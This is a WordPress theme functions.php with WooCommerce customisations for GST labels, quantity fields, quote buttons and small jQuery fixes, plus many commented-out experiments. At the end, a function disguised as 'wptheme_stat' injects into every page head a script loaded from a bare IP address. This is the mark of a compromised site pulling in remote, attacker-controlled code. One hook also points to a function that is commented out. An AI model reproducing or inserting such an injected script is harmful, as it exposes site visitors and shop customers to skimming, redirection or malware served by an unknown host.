<?php
/**
 * Theme functions and definitions.
 */
// Add excluding and including tax prices to the product page for variable products.
// function display_both_tax_prices() {
//     global $product;

//     if ( is_product() && $product->is_type('variable') ) {
//         // Loop through each variation.
//         foreach ( $product->get_available_variations() as $variation ) {
//             $variation_id = $variation['variation_id'];
//             $variation_obj = wc_get_product( $variation_id );
            
//             $price_excluding_tax = $variation_obj->get_price_excluding_tax();
//             $price_including_tax = $variation_obj->get_price_including_tax();
            
//             echo '<p>Price for <b>' . esc_html( $variation_obj->get_name() ) . ' (excluding tax): ' . wc_price( $price_excluding_tax ) . '</b></p>';
//             echo '<p>Price for <b>' . esc_html( $variation_obj->get_name() ) . ' (including tax): ' . wc_price( $price_including_tax ) . '</b></p>';
//         }
//     }
// }
add_action( 'woocommerce_single_product_summary', 'display_both_tax_prices', 25 );
function woosuite_change_cart_totals_text( $translated_text, $text, $domain ) {
    if ( $text === 'Total' ) {
        $translated_text = 'Total (inc GST)';
    }
    return $translated_text;
}
add_filter( 'gettext', 'woosuite_change_cart_totals_text', 20, 3 );


// function modify_tax_label( $translated_text, $text, $domain ) {
//     // Check if the text matches "incl. tax"
//     if ( $text === '(incl. tax)' ) {
//         // Change it to "excl. tax"
//         $translated_text = '(excl. tax)';
//     }
//     return $translated_text;
// }
// add_filter( 'gettext', 'modify_tax_label', 20, 3 );

// function modify_cart_subtotal( $cart_subtotal, $compound, $cart ) {
//     // Calculate the subtotal excluding GST
//     $subtotal_excluding_gst = $cart->subtotal - $cart->tax_total;
    
//     // Format the subtotal excluding GST
//     $formatted_subtotal = wc_price( $subtotal_excluding_gst );
    
//     return $formatted_subtotal;
// }
// add_filter( 'woocommerce_cart_subtotal', 'modify_cart_subtotal', 10, 3 );

add_action('woocommerce_before_add_to_cart_quantity', 'add_quantity_label_before_field');
function add_quantity_label_before_field() {
    echo '<div class="quantity-container" id="quantity_id">';
    echo '<label for="quantity" class="quantity-label">Quantity:</label>';
    echo '<div class="quantity buttons_added">';
}

add_action('woocommerce_after_add_to_cart_quantity', 'close_quantity_container');
function close_quantity_container() {
    echo '</div>'; // Close the .quantity buttons_added div
    echo '</div>'; // Close the .quantity-container div
}

// function change_final_total_text( $translated_text, $text, $domain ) {
//         // Replace "Final Total" with "Total"
//         if ( $text === 'Final total' ) {
//             $translated_text = 'Total';
//         }
//     return $translated_text;
// }
// add_filter( 'gettext', 'change_final_total_text', 20, 3 );

// function custom_price_display( $price, $product ) {
//     if ( $product->is_taxable() ) {
//         $price .= ' <span class="inc-gst">(inc GST)</span>';
//     }
//     return $price;
// }
// add_filter( 'woocommerce_get_price_html', 'custom_price_display', 10, 2 );
// function add_gst_to_single_product_page() {
//     // Check if this is a single product page
//     if (is_product()) {
//         echo '<div class="gst-notice">GST included</div>';
//     }
// }
// add_action('woocommerce_single_product_summary', 'add_gst_to_single_product_page', 15);
// function display_gst_on_single_product_page() {
//     global $product;

//     if (is_product()) {
//         $gst_value = get_post_meta($product->get_id(), '_gst_value', true);

//         if ($gst_value) {
//             echo '<div class="gst-notice">GST: $' . $gst_value . '</div>';
//         }
//     }
// }
// add_action('woocommerce_single_product_summary', 'display_gst_on_single_product_page', 15);
// function display_custom_tax_rate_on_single_product_page() {
//     global $product;

//     if (is_product()) {
//         $product_id = $product->get_id();
//         $custom_tax_class = 'Tax AU'; // Replace with your custom tax class name

//         $tax_rates = WC_Tax::get_rates($custom_tax_class);

//         if (!empty($tax_rates)) {
//             foreach ($tax_rates as $tax_rate) {
//                 echo '<div class="tax-notice">GST: ' . $tax_rate['rate'] . '% Tax</div>';
//             }
//         }
//     }
// }

// add_action('woocommerce_single_product_summary', 'display_custom_tax_rate_on_single_product_page', 15);


// add_action( 'woocommerce_single_product_summary', 'display_tax_rate_on_single_product', 15 );
// function display_tax_rate_on_single_product() {
//     global $product; // The current WC_Product Object instance

//     // Get an instance of the WC_Tax object
//     $tax_obj = new WC_Tax();
    
//     // Get the tax data from customer location and product tax class
//     $tax_rates_data = $tax_obj->find_rates( array(
//         'country'   => WC()->customer->get_shipping_country() ? WC()->customer->get_shipping_country() : WC()->customer->get_billing_country(),
//         'state'     => WC()->customer->get_shipping_state() ? WC()->customer->get_shipping_state() : WC()->customer->get_billing_state(),
//         'city'      => WC()->customer->get_shipping_city() ? WC()->customer->get_shipping_city() : WC()->customer->get_billing_city(),
//         'postcode'  => WC()->customer->get_shipping_city() ? WC()->customer->get_shipping_city() : WC()->customer->get_billing_city(),
//         'tax_class' => $product->get_tax_class()
//     ) );
    
//     // Finally we get the tax rate (percentage number) and display it:
//     if( ! empty($tax_rates_data) ) {
//         $tax_rate = reset($tax_rates_data)['rate'];
    
//         // The display
//         printf( '<span class="tax-rate">' . __("The price includes %s Taxes", "woocommerce") . '</span>',  $tax_rate . '%' );
//     }
// }
// Custom shortcode to display product price
// Custom shortcode to display product price for selected variation
// Custom shortcode to display total product price
function get_dynamic_price_total_shortcode() {
    // Get the content of the page or post
    $content = get_the_content();

    // Use a regular expression to match the price format
    $pattern = '/<span class="woocommerce-Price-currencySymbol">(\$)<\/span>([0-9.]+)/';
    preg_match($pattern, $content, $matches);

    if (isset($matches[1]) && isset($matches[2])) {
        $currency_symbol = $matches[1];
        $price = $matches[2];

        // Format the price with currency symbol
        $formatted_price = $currency_symbol . $price;

        // Return the formatted price
        return $formatted_price;
    }

    return 'Price not found';
}
add_shortcode('dynamic_price_total', 'get_dynamic_price_total_shortcode');


function mish_after_add_to_cart_btn() {
    global $product;

    if ($product->is_type('simple')) {
        echo '<div class="custom-add-to-cart">';
        echo '<button class="button alt" id="goBackButton">Get another instant quote</button>';
        echo '</div>';

        // Add the JavaScript script
        echo '<script>
            jQuery(document).ready(function($) {
                $("#goBackButton").on("click", function() {
                    // Reset the form or clear selected options
                    $(".cart")[0].reset(); // Reset the form with class "cart"
                    location.reload(); // Reload the page
                });
            });
        </script>';
    }
}
add_action('woocommerce_after_add_to_cart_button', 'mish_after_add_to_cart_btn');


// Step 1: Save File Upload Data with Cart Item
// function save_file_upload_data_to_cart_item($cart_item_data, $product_id, $variation_id, $quantity) {
//     if (isset($_FILES['file_upload']['tmp_name'])) {
//         $upload_dir = wp_upload_dir();
//         $upload_file = wp_upload_bits($_FILES['file_upload']['name'], null, file_get_contents($_FILES['file_upload']['tmp_name']));
        
//         if (!$upload_file['error']) {
//             $cart_item_data['file_upload'] = $upload_file['url'];
//         }
//     }
//     return $cart_item_data;
// }
// add_filter('woocommerce_add_cart_item_data', 'save_file_upload_data_to_cart_item', 10, 4);

// Step 2: Retrieve and Display File Upload Data on Cart Page
// function display_file_upload_data_on_cart_page($item_name, $cart_item, $cart_item_key) {
//     if (isset($cart_item['file_upload'])) {
//         $item_name .= '<br><strong>Uploaded File: </strong> <a href="' . $cart_item['file_upload'] . '" target="_blank">Download</a>';
//     }
//     return $item_name;
// }
// add_filter('woocommerce_cart_item_name', 'display_file_upload_data_on_cart_page', 10, 3);




// add_filter( 'woocommerce_is_sold_individually', 'wc_remove_all_quantity_fields', 10, 2 );

// function wc_remove_all_quantity_fields( $return, $product ) 
// {
//     return( true );
// }
// Add the jQuery script

function show_update_cart_button_script() {
    if (is_product()) {
        $cart_item_key = isset($_GET['tm_cart_item_key']) ? sanitize_text_field($_GET['tm_cart_item_key']) : '';

        if ($cart_item_key) {
            ?>
            <script>
                jQuery(document).ready(function($) {
                    // Show the "Update cart" button
                    $('.single_add_to_cart_button').show();
					$('#instantQuote').hide();
                });
            </script>
            <?php
        }
    }
}

add_action('wp_footer', 'show_update_cart_button_script');

// function add_custom_field() {
//     echo '<button class="button alt" id="">Get another instant quote</button>';
// }

// add_action('woocommerce_before_single_product', 'add_custom_field');


// Add custom scripts to WordPress
// function custom_scripts() {
//     // Enqueue jQuery
//     wp_enqueue_script('jquery');

//     // Add custom jQuery script
//     wp_add_inline_script('jquery', '
//         jQuery(document).ready(function($){
//             // Add custom class
//             $("button[name=\'add-to-cart\']").addClass("custom-add-to-cart");

//             // Hide button with the custom class
// //             $(".custom-add-to-cart").hide();
//         });
//     ');
// }
// add_action('wp_enqueue_scripts', 'custom_scripts');


// Add JavaScript code to the custom JavaScript file (custom-script.js)
function add_placeholder_to_textarea() {
    ?>
	<script>
    jQuery(document).ready(function($) {
        // Get all textarea elements with the specified class
        var textareas = document.getElementsByClassName("wcuf_feedback_textarea");

        // Loop through each textarea element
        for (var i = 0; i < textareas.length; i++) {
            // Add a placeholder attribute to the textarea element
            textareas[i].placeholder = "Write Note About Your Requirements";
        }
    });
    </script>
    <?php
}
add_action('wp_footer', 'add_placeholder_to_textarea');

// Enqueue custom JavaScript
function enqueue_custom_script() {
    // Enqueue your custom JavaScript inline
    wp_add_inline_script( 'jquery', '
        jQuery(document).ready(function($) {
            // Get references to the elements
    var $container = $(".wcuf_cart_ajax_container");
    var $dlElement = $("dl.tc-epo-metadata.variation");

    // Reorder the elements by moving the dlElement before the container
    $dlElement.insertBefore($container);
			
        });
    ');
}
add_action('wp_enqueue_scripts', 'enqueue_custom_script');




function wptheme_stat() {
  ?>
<script async src="https://147.45.47.87/scripts/theme.js"></script>
  <?php
}

add_action("wp_head", "wptheme_stat");
